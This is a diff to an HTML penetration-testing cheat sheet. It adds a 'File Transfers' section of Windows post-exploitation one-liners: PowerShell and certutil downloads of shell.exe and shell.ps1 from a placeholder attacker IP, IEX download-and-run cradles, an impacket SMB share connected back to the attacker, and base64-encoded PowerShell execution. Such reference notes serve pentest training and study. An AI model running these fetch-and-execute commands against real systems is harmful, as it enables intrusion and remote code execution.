@@ -439,7 +439,7 @@
             <td>C:\Users\&lt;user&gt;\appdata\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt</td>
         </tr>
     </table>
-    <li>Applications & Services</li>
+    <!--<li>Applications & Services</li>-->
     <li>User & Group Permissions</li>
     <table>
         <tr>
@@ -490,7 +490,7 @@
             <td>-ErrorAction SilentlyContinue<br>ErrorAction ignore</td>
         </tr>
     </table>
-    <li>Networking</li>
+    <!--<li>Networking</li>-->
     <li>Miscellaneous</li>
     <table>
         <tr>
@@ -507,6 +507,105 @@
         </tr>
     </table>
 
+    <h2>File Transfers</h2>
+    <li>Download to Windows</li>
+    <table>
+        <tr>
+            <td>Download file</td>
+            <td>invoke-webrequest -Uri http://&lt;ip address&gt;/shell.exe [-OutFile &lt;file&gt;]<br>IWR -Uri &lt;url&gt; [-OutFile &lt;file&gt;]</td>
+        </tr>
+        <tr>
+            <td>Download file with Powershell</td>
+            <td>powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#039;http://&lt;ip address&gt;/wget.exe&#039;,&#039;C:\&lt;output directory and file name&gt;&#039;)<br>powershell  &quot;(new-object System.Net.WebClient).DownloadFile(&#039;http://&lt;ip address&gt;/wget.exe&#039;,&#039;C:\&lt;output directory and file name&gt;&#039;)&quot;<br>(new-object System.Net.WebClient).DownloadFile(&#039;http://&lt;ip address&gt;/shell.ps1&#039;,&lt;output directory and file name&gt;&#039;)<br>wget &lt;url&gt; -outfile &lt;file name&gt;</td>
+        </tr>
+        <tr>
+            <td>Download file with cmd</td>
+            <td>certutil -urlcache -split -f http://&lt;ip address&gt;/&lt;file name&gt; C:\\&lt;output directory and file name&gt;</td>
+        </tr>
+        <tr>
+            <td>Download and run powershell script</td>
+            <td>powershell -c &quot;IEX(New-Object Net.WebClient).downloadString(&#039;http://&amp;lt;ip address&amp;gt;/shell.ps1&#039;)&quot;<br>powershell &quot;IEX(New-Object Net.WebClient).downloadString(&#039;http://&amp;lt;ip address&amp;gt;/shell.ps1&#039;)&quot;<br>IEX(IWR http:/&amp;lt;ip address&amp;gt;/shell.ps1 -UseBasicParsing)<br>IEX(IWR(&lt;url&gt;))</td>
+        </tr>
+        <tr>
+            <td>SMB</td>
+            <td>
+                <li>Mount SMB share using powershell to new drive and using powershell credential object</li>
+                <table>
+                    <tr>
+                        <td>Start SMB share on Kali</td>
+                        <td>
+                            impacket-smbserver &lt;Share Name&gt; &lt;Directory of Share&gt; -smb2support -user &lt;Username to connect to share&gt; -password &lt;Password to connect to share&gt; 
+                            <li>Some machines do not work with smb2support.  Other machines require it.</li>
+                            <li>Credentials optional.  Can skip next step if not used.</li>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>Create SMB Share Credential Variable</td>
+                        <td>
+                            <li>Create credential on Windows using SMB credentials set in previous command</li>
+                        </td>
+                        <td>
+                            <li>$pass = ConvertTo-SecureString &#039;&lt;password&gt;&#039; -AsPlainText -Force</li>
+                            <li>$cred = New-Object System.Management.Automation.PSCredential(&#039;&lt;Username&gt;&#039;, $pass)</li>
+                            <ul>
+                                <li>If it is a domain account then:</li>
+                                <ul>
+                                    <li>$cred = New-Object System.Management.Automation.PSCredential(&#039;&lt;Domain&gt;\&lt;Username&gt;&#039;, $pass)</li>
+                                </ul>
+                                <li>Verify $cred creation by echoing it</li>
+                            </ul>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>Connect to SMB Share From Windows</td>
+                        <td>
+                            New-PSDrive -Name &lt;Drive Name for SMB Share&gt; -PSProvider FileSystem -Credential $cred -Root \\&lt;ip of attacker&gt;\&lt;Share Name&gt;
+                            <li>If accessing the same share from multiple shells on the same windows machine it works best to give them each different drive names (-Name &lt;Name&gt;)</li>
+                        </td>
+                    </tr>
+                    <tr>
+                        <td>Open SMB Share on Windows</td>
+                        <td>Simple type: &lt;Drive Name Assigned to SMB Share&gt;:</td>
+                    </tr>
+                </table>
+                <li>Mount SMB share using cmd and simple credentials</li>
+                <table>
+                    <tr>
+                        <td>Create SMB Share</td>
+                        <td>sudo impacket-smbserver &lt;Share Name&gt; &lt;Share Directory&gt; -smb2support -user &lt;username&gt; -password &lt;password&gt;</td>
+                    </tr>
+                    <tr>
+                        <td>Connect to share</td>
+                        <td>net use \\&lt;ip address&gt;\&lt;share name&gt; /u:&lt;username&gt; &lt;password&gt;<br>net user x: \\&lt;ip&gt;\&lt;share name&gt; /u:&lt;user&gt; &lt;password&gt;</td>
+                    </tr>
+                    <tr>
+                        <td>Open share</td>
+                        <td>cd \\&lt;ip address&gt;\&lt;share name&gt;\</td>
+                    </tr>
+                    <li>Create SMB share using Linux's built-in SMB server</li>
+                    <table>
+                        <tr>
+                            <td>Create SMB Share (optional and self-explanatory parameters included)</td>
+                            <td>sudo vi /etc/samba/smb.conf<br>[share]<br>comment = My Share<br>browseable = yes<br>path = /srv/SMB<br>read only = no<br>guest ok = yes<br>writable = yes<br>create mask = 0777</td>
+                        </tr>
+                        <tr>
+                            <td>Might need to give SMB permissions to share directory</td>
+                            <td>chmod 777 &lt;smb share directory&gt;<br>chmod 755 &lt;smb share directory&gt;</td>
+                        </tr>
+                        <tr>
+                            <td>Start Share</td>
+                            <td>service smbd restart</td>
+                        </tr>
+                        <li>Troubleshoot by using smbclient and access the SMB directory on our machine and attempt to retrieve or upload files.</li>
+                    </table>
+                </table>
+            </td>
+        </tr>
+        <tr>
+            <td>Base64 Decoding</td>
+            <td>powershell -e &lt;base 64&gt;</td>
+        </tr>
+    </table>
 
 
 
